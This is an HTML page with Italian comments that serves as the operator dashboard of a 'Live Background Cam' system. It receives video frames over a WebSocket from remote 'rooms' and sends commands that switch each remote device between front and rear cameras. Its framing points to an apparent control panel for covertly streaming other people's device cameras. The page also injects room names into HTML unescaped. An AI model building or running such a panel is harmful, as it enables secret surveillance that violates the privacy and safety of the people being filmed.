<!DOCTYPE html>
<html>
<head>
  <title>Live Background Cam</title>
  <style>
    body { margin:0; background:#111; color:#0f0; font-family:Arial; padding:20px; }
    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:15px; }
    .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#000; position:relative; }
    video { width:100%; height:auto; display:block; background:#000; min-height:200px; }
    h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
    .status { color:#0f0; font-size:12px; text-align:center; padding:4px; }
    .controls { padding:8px; text-align:center; background:rgba(0,0,0,0.8); }
    button { background:#0f0; color:#000; border:none; padding:6px 12px; margin:0 4px; cursor:pointer; }
    button:hover { background:#fff; }
    #debug { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); padding:10px; font-size:12px; }
  </style>
</head>
<body>
  <h1>Camera in Background</h1>
  <div id="grid" class="grid"></div>
  <div id="debug"></div>
  <script>
    const grid = document.getElementById('grid');
    const debug = document.getElementById('debug');
    const ws = new WebSocket('wss://' + location.host + '/bg-admin');
    const rooms = new Map();
    
    function log(msg) {
      console.log(msg);
      debug.innerHTML += msg + '<br>';
    }

    // Invia comando cambio camera
    function sendCameraCommand(room, mode) {
      ws.send(JSON.stringify({ type: 'camera', room, mode }));
      log('[ADMIN] Inviato comando camera: ' + room + ' -> ' + mode);
    }

    // Crea box camera per una nuova room
    function createCameraBox(room) {
      const div = document.createElement('div');
      div.className = 'cam';
      div.innerHTML = `
        <h2>${room}</h2>
        <video id="video-${room}" autoplay playsinline></video>
        <div class="status" id="status-${room}">Online</div>
        <div class="controls">
          <button onclick="sendCameraCommand('${room}','environment')">ðŸ“¸ Posteriore</button>
          <button onclick="sendCameraCommand('${room}','user')">ðŸ¤³ Anteriore</button>
        </div>`;
      grid.appendChild(div);
      rooms.set(room, {
        div: div,
        mediaSource: new MediaSource(),
        sourceBuffer: null,
        queue: []
      });
      
      const video = document.getElementById('video-' + room);
      const mediaSource = rooms.get(room).mediaSource;
      video.src = URL.createObjectURL(mediaSource);
      
      mediaSource.addEventListener('sourceopen', () => {
        const sourceBuffer = mediaSource.addSourceBuffer('video/webm; codecs="vp8,opus"');
        rooms.get(room).sourceBuffer = sourceBuffer;
        log('[ADMIN] MediaSource pronto per ' + room);
      });
      
      return rooms.get(room);
    }

    // Gestione ricezione frame binari e metadati
    let currentRoom = null;
    ws.onmessage = (e) => {
      log('[ADMIN] Ricevuto messaggio: ' + typeof e.data);
      
      // Se il messaggio Ã¨ JSON, contiene metadati (room, timestamp)
      if (typeof e.data === 'string') {
        try {
          const meta = JSON.parse(e.data);
          log('[ADMIN] Meta: ' + JSON.stringify(meta));
          
          if (meta.offline) {
            if (rooms.has(meta.room)) {
              document.getElementById('status-' + meta.room).textContent = 'Offline';
              log('[ADMIN] Camera ' + meta.room + ' offline');
            }
            return;
          }
          
          if (meta.room) {
            currentRoom = meta.room;
            log('[ADMIN] Room attiva: ' + currentRoom);
            
            // Crea box camera se non esiste
            if (!rooms.has(currentRoom)) {
              createCameraBox(currentRoom);
            }
          }
        } catch (err) {
          log('[ADMIN] Errore parsing JSON: ' + err.message);
        }
      } 
      // Se Ã¨ un Blob, Ã¨ un frame video
      else if (e.data instanceof Blob) {
        if (!currentRoom) {
          log('[ADMIN] Frame ricevuto ma nessuna room attiva');
          return;
        }

        log('[ADMIN] Frame ricevuto per ' + currentRoom + ': ' + e.data.size + ' bytes');
        
        // Crea il box della camera se non esiste
        let room = rooms.get(currentRoom);
        if (!room) {
          room = createCameraBox(currentRoom);
        }
        
        // Converti Blob in ArrayBuffer
        e.data.arrayBuffer().then(buffer => {
          try {
            const video = document.getElementById('video-' + currentRoom);
            if (!video) {
              log('[ADMIN] Video element non trovato per ' + currentRoom);
              return;
            }

            // Aggiorna direttamente il video con il nuovo frame
            const blob = new Blob([buffer], { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            
            if (video.src) {
              URL.revokeObjectURL(video.src);
            }
            
            video.src = url;
            video.play().catch(err => log('[ADMIN] Errore play video: ' + err.message));
            
            document.getElementById('status-' + currentRoom).textContent = 'Live';
            log('[ADMIN] Frame aggiornato per ' + currentRoom);
          } catch (err) {
            log('[ADMIN] Errore aggiornamento video: ' + err.message);
          }
        }).catch(err => {
          log('[ADMIN] Errore conversione blob: ' + err.message);
        });
      }
    };

    ws.onopen = () => console.log('[ADMIN] WebSocket connesso');
    ws.onclose = () => console.log('[ADMIN] WebSocket disconnesso');
    ws.onerror = (err) => console.error('[ADMIN] Errore WebSocket:', err);
  </script>
</body>
</html>